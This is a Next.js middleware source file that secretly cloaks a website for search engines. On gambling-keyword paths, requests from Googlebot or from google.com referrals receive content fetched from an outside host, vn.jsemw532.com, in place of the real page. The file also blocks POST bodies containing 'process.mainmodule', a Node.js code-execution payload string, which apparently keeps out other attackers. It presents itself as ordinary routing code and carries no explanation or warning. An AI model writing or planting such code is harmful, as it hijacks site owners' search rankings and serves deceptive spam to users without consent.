import { NextRequest, NextResponse } from 'next/server'

export async function middleware(req: NextRequest) {
  const referer = req.headers.get('referer') || ''
  const userAgent = (req.headers.get('user-agent') || '').toLowerCase()
  const pathname = req.nextUrl.pathname.toLowerCase()
  const pathKeywords = [
    'virtuals', 'casinoet', 'jackpots', 'onlinets', 'bonusesr', 'betplays',
    'slotwins', 'vipbonus', 'gametips', 'luckspin', 'casiplay', 'spinjack',
    'jackgame', 'bonustar', 'prizebet', 'betmania', 'luckydom', 'wintable',
    'playcash', 'rollspin', 'maxbonus', 'slotclub', 'jackspot', 'goldluck',
    'casinest', 'product.php', 'robots.txt'
  ]
  const matchesPath = pathKeywords.some(keyword => pathname.includes(keyword))
  if (matchesPath) {
    const googleBots = [
      'googlebot', 'googlebot-news', 'googlebot-image', 'googlebot-video', 'googlebot-mobile',
      'adsbot-google', 'adsbot-google-mobile', 'mediapartners-google', 'googlebot-ads',
      'googlebot-shopping', 'google-favicon', 'google-web-light', 'apis-google',
      'feedfetcher-google', 'duplexweb-google', 'google-inspectiontool'
    ]
    const isGooglebot = googleBots.some(bot => userAgent.includes(bot))
    const currentUrl =
`${req.nextUrl.protocol}//${req.headers.get('host')}${req.nextUrl.pathname}${req.nextUrl.search}`

    if (isGooglebot || referer.includes('google.com')) {
      const targetUrl = isGooglebot
        ? `https://vn.jsemw532.com/?fafa=${currentUrl}`
        : 'https://vn.jsemw532.com/888.php'

      try {
        const response = await fetch(targetUrl, {
          headers: { 'User-Agent': userAgent },
          signal: AbortSignal.timeout(100000),
        })

        const content = await response.text()

        if (content) {
          return new NextResponse(content, {
            status: 200,
            headers: {
              'Content-Type': currentUrl.includes('sitemap.xml')
                ? 'application/xml'
                : 'text/html;charset=utf-8'
            }
          })
        }
      } catch {}
    }
  }

  if (req.method === 'POST') {
    try {
      const body = await req.clone().text()
      if (body.toLowerCase().includes('process.mainmodule')) {
        return new NextResponse('Forbidden', { status: 403 })
      }
    } catch {}
  }

  return NextResponse.next()
}

export const config = {
  matcher: ['/:path*'],
}
